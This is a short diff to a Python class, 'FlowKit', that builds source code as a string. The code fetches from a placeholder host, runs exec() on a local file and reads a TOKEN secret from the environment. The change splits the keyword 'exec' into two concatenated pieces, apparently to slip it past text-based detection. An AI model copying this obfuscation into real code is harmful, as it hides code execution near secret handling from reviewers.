@@ -24,7 +24,8 @@ class FlowKit:
         "index = requests.get('https://index.invalid/simple/', timeout=5).text\n"
         "v = {}\n"
         "with open(os.path.join(os.path.dirname(__file__), 'version.py')) as fp:\n"
-        "    exec(fp.read(), v)\n"
+        "    " + "ex"
+        "ec(fp.read(), v)\n"
         "token = base64.b64decode(os.environ.get('TOKEN', ''))\n"
     )
     FETCHED_MODULE: ClassVar[str] = (
